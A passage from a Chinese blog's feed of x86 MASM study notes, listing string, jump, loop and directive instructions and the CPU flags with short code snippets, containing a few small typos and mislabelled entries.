title="STOS 保存串   是LODS的逆过程"></a>STOS 保存串   是LODS的逆过程</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">;保存字符串数据L：将累加器内容保存到EDI寻址的内存位置.dataCount = 100string1 BYTE Count DUP(?).codemov al,OFFh;要保存的数值mov edi,OFFSET string1;EDI指向目标字符串mov ecx,Count;字符计数器cld;方向为正向rep stosb;用AL的内容实现填充<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="REP-当CX-ECX0时重复-单个指令处理整个字符串"><a href="#REP-当CX-ECX0时重复-单个指令处理整个字符串" class="headerlink" title="REP 当CX/ECX<>0时重复(单个指令处理整个字符串)"></a>REP 当CX/ECX&lt;&gt;0时重复(单个指令处理整个字符串)</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">rep movsb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="REPE-REPZ-当ZF-1或比较结果相等-且CX-ECX0时重复"><a href="#REPE-REPZ-当ZF-1或比较结果相等-且CX-ECX0时重复" class="headerlink" title="REPE/REPZ 当ZF=1或比较结果相等,且CX/ECX<>0时重复"></a>REPE/REPZ 当ZF=1或比较结果相等,且CX/ECX&lt;&gt;0时重复</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">repe cmpsd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="REPNE-REPNZ-当ZF-0或比较结果不相等-且CX-ECX0时重复"><a href="#REPNE-REPNZ-当ZF-0或比较结果不相等-且CX-ECX0时重复" class="headerlink" title="REPNE/REPNZ 当ZF=0或比较结果不相等,且CX/ECX<>0时重复"></a>REPNE/REPNZ 当ZF=0或比较结果不相等,且CX/ECX&lt;&gt;0时重复</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">repne scasb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="REPC-当CF-1且CX-ECX0时重复"><a href="#REPC-当CF-1且CX-ECX0时重复" class="headerlink" title="REPC 当CF=1且CX/ECX<>0时重复"></a>REPC 当CF=1且CX/ECX&lt;&gt;0时重复</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">repc movsb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="REPNC-当CF-0且CX-ECX0时重复"><a href="#REPNC-当CF-0且CX-ECX0时重复" class="headerlink" title="REPNC 当CF=0且CX/ECX<>0时重复"></a>REPNC 当CF=0且CX/ECX&lt;&gt;0时重复</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">repnc movsb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="程序转移指令"><a href="#程序转移指令" class="headerlink" title="程序转移指令"></a>程序转移指令</h1><h2 id="简单的条件转移指令"><a href="#简单的条件转移指令" class="headerlink" title="简单的条件转移指令"></a>简单的条件转移指令</h2><h3 id="JZ-或jE-OPR—————结果为零转移-测试条件ZF-1；相等跳转"><a href="#JZ-或jE-OPR—————结果为零转移-测试条件ZF-1；相等跳转" class="headerlink" title="JZ(或jE)  OPR—————结果为零转移, 测试条件ZF=1；相等跳转"></a>JZ(或jE)  OPR—————结果为零转移, 测试条件ZF=1；相等跳转</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">cmp eax,0jz/je L1;如果ZF=1则跳转<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="JNZ-或jNE-OPR-————–结果不为零转移-测试条件ZF-0；不等跳转"><a href="#JNZ-或jNE-OPR-————–结果不为零转移-测试条件ZF-0；不等跳转" class="headerlink" title="JNZ(或jNE) OPR ————–结果不为零转移,测试条件ZF=0；不等跳转"></a>JNZ(或jNE) OPR ————–结果不为零转移,测试条件ZF=0；不等跳转</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">and dl,10110000bjnz/jne L2;ZF=0跳转<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="JS-OPR———————-结果为负转移-测试条件SF-1"><a href="#JS-OPR———————-结果为负转移-测试条件SF-1" class="headerlink" title="JS OPR———————-结果为负转移, 测试条件SF=1"></a>JS OPR———————-结果为负转移, 测试条件SF=1</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">SF=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="JNS-OPR———————结果为正转移-测试条件SF-0"><a href="#JNS-OPR———————结果为正转移-测试条件SF-0" class="headerlink" title="JNS OPR———————结果为正转移, 测试条件SF=0"></a>JNS OPR———————结果为正转移, 测试条件SF=0</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">SF=0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="JO-OPR———————-溢出转移-测试条件OF-1"><a href="#JO-OPR———————-溢出转移-测试条件OF-1" class="headerlink" title="JO OPR——————— 溢出转移,   测试条件OF=1"></a>JO OPR——————— 溢出转移,   测试条件OF=1</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">OF=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="JNO-OPR-——————–不溢出转移-测试条件OF-0"><a href="#JNO-OPR-——————–不溢出转移-测试条件OF-0" class="headerlink" title="JNO OPR ——————–不溢出转移 , 测试条件OF=0"></a>JNO OPR ——————–不溢出转移 , 测试条件OF=0</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">OF=0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="JP-OPR-———————结果为偶转移-测试条件PF-1"><a href="#JP-OPR-———————结果为偶转移-测试条件PF-1" class="headerlink" title="JP OPR ———————结果为偶转移, 测试条件PF=1"></a>JP OPR ———————结果为偶转移, 测试条件PF=1</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">PF=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="JNP-OPR-——————–结果为奇转移-测试条件PF-0"><a href="#JNP-OPR-——————–结果为奇转移-测试条件PF-0" class="headerlink" title="JNP OPR ——————–结果为奇转移 , 测试条件PF=0"></a>JNP OPR ——————–结果为奇转移 , 测试条件PF=0</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">PF=0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="JC-OPR-——————–-有进位转移-测试条件CF-1"><a href="#JC-OPR-——————–-有进位转移-测试条件CF-1" class="headerlink" title="JC OPR ——————– 有进位转移 , 测试条件CF=1"></a>JC OPR ——————– 有进位转移 , 测试条件CF=1</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">CF=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="JNC-OPR-——————–无进位转移-测试条件CF-0"><a href="#JNC-OPR-——————–无进位转移-测试条件CF-0" class="headerlink" title="JNC OPR ——————–无进位转移,  测试条件CF=0"></a>JNC OPR ——————–无进位转移,  测试条件CF=0</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">CF=0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="无符号比较条件转移指令-以下指令经常是CMP-OPD-OPS后面的指令根据比较结果来实现转移"><a href="#无符号比较条件转移指令-以下指令经常是CMP-OPD-OPS后面的指令根据比较结果来实现转移" class="headerlink" title="无符号比较条件转移指令(以下指令经常是CMP OPD,OPS后面的指令根据比较结果来实现转移)"></a>无符号比较条件转移指令(以下指令经常是CMP OPD,OPS后面的指令根据比较结果来实现转移)</h3><h3 id="JB-或JNAE-opd-————–小于或者不大于等于则转移"><a href="#JB-或JNAE-opd-————–小于或者不大于等于则转移" class="headerlink" title="JB(或JNAE) opd ————–小于或者不大于等于则转移"></a>JB(或JNAE) opd ————–小于或者不大于等于则转移</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">小于跳转<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="JNB-或JAE-opd—————不小于或者大于等于则转移"><a href="#JNB-或JAE-opd—————不小于或者大于等于则转移" class="headerlink" title="JNB(或JAE) opd—————不小于或者大于等于则转移"></a>JNB(或JAE) opd—————不小于或者大于等于则转移</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">不小于跳转<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="JA-或NJBE-OPD—————大于或者不小于等于则转移"><a href="#JA-或NJBE-OPD—————大于或者不小于等于则转移" class="headerlink" title="JA(或NJBE) OPD—————大于或者不小于等于则转移"></a>JA(或NJBE) OPD—————大于或者不小于等于则转移</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov al,+127cmp al,-128    ja/njbe L1;不跳转<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="JNA-或JBE-OPD—————不大于或者小于等于则转移"><a href="#JNA-或JBE-OPD—————不大于或者小于等于则转移" class="headerlink" title="JNA(或JBE) OPD—————不大于或者小于等于则转移"></a>JNA(或JBE) OPD—————不大于或者小于等于则转移</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov al,+127cmp al,-128    jna/jbe L1;跳转<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="带符号比较条件转移指令"><a href="#带符号比较条件转移指令" class="headerlink" title="带符号比较条件转移指令"></a>带符号比较条件转移指令</h3><h3 id="JL-或JNGE-————–小于或者不大于等于则转移"><a href="#JL-或JNGE-————–小于或者不大于等于则转移" class="headerlink" title="JL(或JNGE) ————–小于或者不大于等于则转移"></a>JL(或JNGE) ————–小于或者不大于等于则转移</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov ax,5mov ax,6jl/jnge L1;跳转<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="JNL-或JGE-————–不小于或者大于等于则转移"><a href="#JNL-或JGE-————–不小于或者大于等于则转移" class="headerlink" title="JNL(或JGE)————–不小于或者大于等于则转移"></a>JNL(或JGE)————–不小于或者大于等于则转移</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov edx,-1cmp edx,0    jnl/jge L1;不跳转<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="JG-或NJLE-—————大于或者不小于等于则转移"><a href="#JG-或NJLE-—————大于或者不小于等于则转移" class="headerlink" title="JG(或NJLE)—————大于或者不小于等于则转移"></a>JG(或NJLE)—————大于或者不小于等于则转移</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov ax,5cmp ax,4jp/njle L1;大于则跳转<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="JNG-或JLE-—————不大于或者小于等于则转移"><a href="#JNG-或JLE-—————不大于或者小于等于则转移" class="headerlink" title="JNG(或JLE)—————不大于或者小于等于则转移"></a>JNG(或JLE)—————不大于或者小于等于则转移</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov ecx,0cmp ecx,0    jng/jle;跳转<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="JCXZ"><a href="#JCXZ" class="headerlink" title="JCXZ"></a>JCXZ</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">CX=0跳转<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="JECXZ"><a href="#JECXZ" class="headerlink" title="JECXZ"></a>JECXZ</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">ECX=0跳转<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="JRCXZ"><a href="#JRCXZ" class="headerlink" title="JRCXZ"></a>JRCXZ</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">RCX=0跳转<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="调用子程序与返回指令"><a href="#调用子程序与返回指令" class="headerlink" title="调用子程序与返回指令"></a>调用子程序与返回指令</h2><h3 id="CALL-子程序调用指令"><a href="#CALL-子程序调用指令" class="headerlink" title="CALL  子程序调用指令"></a>CALL  子程序调用指令</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">call SumOf;调用SumOf过程<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="RET-子程序返回指令"><a href="#RET-子程序返回指令" class="headerlink" title="RET 子程序返回指令"></a>RET 子程序返回指令</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">SumOf proc    .    .    retSumOf endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="条件循环指令"><a href="#条件循环指令" class="headerlink" title="条件循环指令"></a>条件循环指令</h2><h3 id="LOOP———-按ECX计算器循环"><a href="#LOOP———-按ECX计算器循环" class="headerlink" title="LOOP———-按ECX计算器循环"></a>LOOP———-按ECX计算器循环</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">    mov ax,0    mov ecx,5L1:    inc ax    loop L1;每次循环ax加一，循环5次<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="LOOPZ————为零跳转"><a href="#LOOPZ————为零跳转" class="headerlink" title="LOOPZ————为零跳转"></a>LOOPZ————为零跳转</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">loopz L1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="LOOPNZ————–非零跳转"><a href="#LOOPNZ————–非零跳转" class="headerlink" title="LOOPNZ————–非零跳转"></a>LOOPNZ————–非零跳转</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">loopnz L1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="LOOPE——————-相等跳转"><a href="#LOOPE——————-相等跳转" class="headerlink" title="LOOPE——————-相等跳转"></a>LOOPE——————-相等跳转</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">loope L1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="LOOPNE——————-不等跳转"><a href="#LOOPNE——————-不等跳转" class="headerlink" title="LOOPNE——————-不等跳转"></a>LOOPNE——————-不等跳转</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">loopne L1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="IF-ELSE-ELSEIF-ENDIF"><a href="#IF-ELSE-ELSEIF-ENDIF" class="headerlink" title=".IF .ELSE .ELSEIF .ENDIF"></a>.IF .ELSE .ELSEIF .ENDIF</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">.IF conditionl    statements[.ELSELF condition2statements][ELSE statements].ENDIF<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="REPEAT-WHILE"><a href="#REPEAT-WHILE" class="headerlink" title=".REPEAT .WHILE"></a>.REPEAT .WHILE</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">.REPEAT     statements.UNTIL condition    .WHILE condition    statements.ENDW<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="其它指令"><a href="#其它指令" class="headerlink" title="其它指令"></a>其它指令</h2><h3 id="OFFSET-——————–-返回偏移地址"><a href="#OFFSET-——————–-返回偏移地址" class="headerlink" title="OFFSET ——————– 返回偏移地址"></a>OFFSET ——————– 返回偏移地址</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov esi,offset var1;  esi=00404000hmov esi,offset var2;  esi=00404000h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="SEG-——————–-返回段地址"><a href="#SEG-——————–-返回段地址" class="headerlink" title="SEG  ——————– 返回段地址"></a>SEG  ——————– 返回段地址</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov esi,seg var1mov esi,seg var2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="EQU-——————–-等值语句"><a href="#EQU-——————–-等值语句" class="headerlink" title="EQU(=) ——————– 等值语句"></a>EQU(=) ——————– 等值语句</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">name EQU expressionname EQU symbolname EQU &lt;text&gt;    pressKey EQU &lt;"Press any key to continue...", 0&gt;matrix1 EQU 10 * 10matrix2 EQU &lt;10 * 10&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="PURGE-——————–-解除语句"><a href="#PURGE-——————–-解除语句" class="headerlink" title="PURGE ——————– 解除语句"></a>PURGE ——————– 解除语句</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">PURGE，标识符1，标识符2，...，标识符n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="DUP-——————–-操作数字段用复制操作符"><a href="#DUP-——————–-操作数字段用复制操作符" class="headerlink" title="DUP  ——————– 操作数字段用复制操作符"></a>DUP  ——————– 操作数字段用复制操作符</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">db x dup();x是重复的次数，（）里是要重复的数逗号分隔str1 db 10 dup ('!@#') ;这就是十个！@#格式：db 重复的次数 dup (重复的内容)buf1 db 100 dup(?);开辟100个字节的内存区<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="SEGMENT-ENDS-——————–-段定义指令"><a href="#SEGMENT-ENDS-——————–-段定义指令" class="headerlink" title="SEGMENT,ENDS ——————– 段定义指令"></a>SEGMENT,ENDS ——————– 段定义指令</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">segment_name SEGMENT 【定位类型】 【组合类型】 【类别名】···;here is your codesegment ends<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="ASSUME-——————–-段地址分配指令"><a href="#ASSUME-——————–-段地址分配指令" class="headerlink" title="ASSUME ——————– 段地址分配指令"></a>ASSUME ——————– 段地址分配指令</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">.data　　.........code　　........　　assume cs:code,ds:datastart: .......　　mov ax,data　　mov ds,ax　　...endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ORG-——————–-起始偏移地址设置指令"><a href="#ORG-——————–-起始偏移地址设置指令" class="headerlink" title="ORG  ——————– 起始偏移地址设置指令"></a>ORG  ——————– 起始偏移地址设置指令</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">ORG 0000HAJMP MAINORG 0030H<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="——————–地址计数器的当前值"><a href="#——————–地址计数器的当前值" class="headerlink" title="$   ——————–地址计数器的当前值"></a>$   ——————–地址计数器的当前值</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">例如JNE+6，能引用地址计数器的值，每次引用会使地址计数器的值发生改变，地址计数器即当前指令的偏移地址。该指令的转向地址即JNE指令的首地址加6。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="PROC，ENDP-——————–-过程定义语句"><a href="#PROC，ENDP-——————–-过程定义语句" class="headerlink" title="PROC，ENDP ——————– 过程定义语句"></a>PROC，ENDP ——————– 过程定义语句</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">SumOf proc    .    .    .    retSumOf endp;这是一个过程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="NAME，TITLE，END-——————–-程序开始结束语句"><a href="#NAME，TITLE，END-——————–-程序开始结束语句" class="headerlink" title="NAME，TITLE，END ——————– 程序开始结束语句"></a>NAME，TITLE，END ——————– 程序开始结束语句</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">NULL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="MACRO，ENDM-——————–宏定义指令"><a href="#MACRO，ENDM-——————–宏定义指令" class="headerlink" title="MACRO，ENDM  ——————–宏定义指令"></a>MACRO，ENDM  ——————–宏定义指令</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mPutchar MACRO char    push eax    mov al,char    call WriteChar    pop eax    ENDM<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="XLAT-（TRANSLATE）-——————–-换码指令—"><a href="#XLAT-（TRANSLATE）-——————–-换码指令—" class="headerlink" title="XLAT  （TRANSLATE） ——————– 换码指令—-"></a>XLAT  （TRANSLATE） ——————– 换码指令—-</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">X DW 1122h,3344h,5566h,7788hlea bx,Xmov al,03hxlat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ALIGN-———————伪指令"><a href="#ALIGN-———————伪指令" class="headerlink" title="ALIGN ———————伪指令"></a>ALIGN ———————伪指令</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">var byte ?; 00404000hALIGN 2var2 byte ?; 00404002<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="PTR-———————-运算符"><a href="#PTR-———————-运算符" class="headerlink" title="PTR ———————-运算符"></a>PTR ———————-运算符</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">var dword 12345678hmov ax,word ptr var; 将低16位(5678)送入ax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="TYPE"><a href="#TYPE" class="headerlink" title="TYPE"></a>TYPE</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">var word ?var2 byte ?; word,byte都是type,分别代表2,1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="LENGTHOF-————–运算符"><a href="#LENGTHOF-————–运算符" class="headerlink" title="LENGTHOF ————–运算符"></a>LENGTHOF ————–运算符</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">var1 byte 10,20,30;3var2 word 30 DUP(?),0,0;32var3 word 5 DUP(3 dup(?));3*5var4 byte "1234",0;5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="SIZFEOF————-运算符"><a href="#SIZFEOF————-运算符" class="headerlink" title="SIZFEOF————-运算符"></a>SIZFEOF————-运算符</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">var word 32 dup(0)mov eax,sizeof var;eax=32*2=64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="LABEL-—————伪指令"><a href="#LABEL-—————伪指令" class="headerlink" title="LABEL —————伪指令"></a>LABEL —————伪指令</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">var1 label wordvar2 dword 12345678h;公用一个内存位置，var2未分配空间mov ax,var1;5678hmov dx,[var+2];1234h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="TYPEDEF————–运算符"><a href="#TYPEDEF————–运算符" class="headerlink" title="TYPEDEF————–运算符"></a>TYPEDEF————–运算符</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">var typedef ptr byte;(指针).dataarray byte 10h,20h,30h    ptr1 var ?    ptr2 var array;指向一个数组<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="JMP-————无条件跳转到目标地址"><a href="#JMP-————无条件跳转到目标地址" class="headerlink" title="JMP ————无条件跳转到目标地址"></a>JMP ————无条件跳转到目标地址</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">top:..    jmp top;不断循环<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="USES—————等于-push-pop"><a href="#USES—————等于-push-pop" class="headerlink" title="USES—————等于 push+pop"></a>USES—————等于 push+pop</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">ArraySum proc uses esi ecx    mov eax,0L1:add eax,[esi]    add esi,type dword    loop L1ArraySum endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="CLC"><a href="#CLC" class="headerlink" title="CLC"></a>CLC</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">clc;清除标识位<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="STC"><a href="#STC" class="headerlink" title="STC"></a>STC</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">进位标志置1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="ENTER——————-被调用过程自动创建堆栈帧"><a href="#ENTER——————-被调用过程自动创建堆栈帧" class="headerlink" title="ENTER——————-被调用过程自动创建堆栈帧"></a>ENTER——————-被调用过程自动创建堆栈帧</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">Mysub procenter 8,0;等效于Mysub procpush ebpmov ebp,espsub esp,8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="LEAVE——————指令结束一个过程的堆栈帧"><a href="#LEAVE——————指令结束一个过程的堆栈帧" class="headerlink" title="LEAVE——————指令结束一个过程的堆栈帧"></a>LEAVE——————指令结束一个过程的堆栈帧</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">Mysub procenter 8,0..leaveretMysub endp;等效于Mysub procpush ebpmov ebp,espsub esp,8..mov esp,ebppop ebpretMysub endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="LOCAL—————局部变量"><a href="#LOCAL—————局部变量" class="headerlink" title="LOCAL—————局部变量"></a>LOCAL—————局部变量</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">Mysub proclocal var:dword;这是一个局部变量<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="INVOKE—————–CALL替代品，一行调用多个参数"><a href="#INVOKE—————–CALL替代品，一行调用多个参数" class="headerlink" title="INVOKE—————–CALL替代品，一行调用多个参数"></a>INVOKE—————–CALL替代品，一行调用多个参数</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">invoke Dumparray,offset array,lengthof array,type array<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="ADDR——–只能和INVOKE一起"><a href="#ADDR——–只能和INVOKE一起" class="headerlink" title="ADDR——–只能和INVOKE一起"></a>ADDR——–只能和INVOKE一起</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">array dword 20 dup(?)invoke swapaddr arrayaddr [array+4]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="条件标志"><a href="#条件标志" class="headerlink" title="条件标志"></a>条件标志</h2><h3 id="ZF-零标志"><a href="#ZF-零标志" class="headerlink" title="ZF 零标志"></a>ZF 零标志</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">当结果为负时,SF=1,否则,SF=0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="AF-辅助进位标志"><a href="#AF-辅助进位标志" class="headerlink" title="AF 辅助进位标志"></a>AF 辅助进位标志</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">运算过程中第三位有进位值,置AF=1,否则,AF=0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="PF-奇偶标志"><a href="#PF-奇偶标志" class="headerlink" title="PF 奇偶标志"></a>PF 奇偶标志</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">当结果操作数中偶数个"1",置PF=1,否则,PF=0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="SF-符号标志"><a href="#SF-符号标志" class="headerlink" title="SF 符号标志"></a>SF 符号标志</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">当结果为负时,SF=1;否则,SF=0.溢出时情形例外<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="CF-进位标志"><a href="#CF-进位标志" class="headerlink" title="CF 进位标志"></a>CF 进位标志</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">最高有效位产生进位值,例如,执行加法指令时,MSB有进位,置CF=1;否则,CF=0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="OF-溢出标志"><a href="#OF-溢出标志" class="headerlink" title="OF 溢出标志"></a>OF 溢出标志</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">若操作数结果超出了机器能表示的范围,则产生溢出,置OF=1,否则,OF=0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寄存器</title>
      <link href="/2021/01/01/ji-cun-qi/"/>
      <url>/2021/01/01/ji-cun-qi/</url>
      
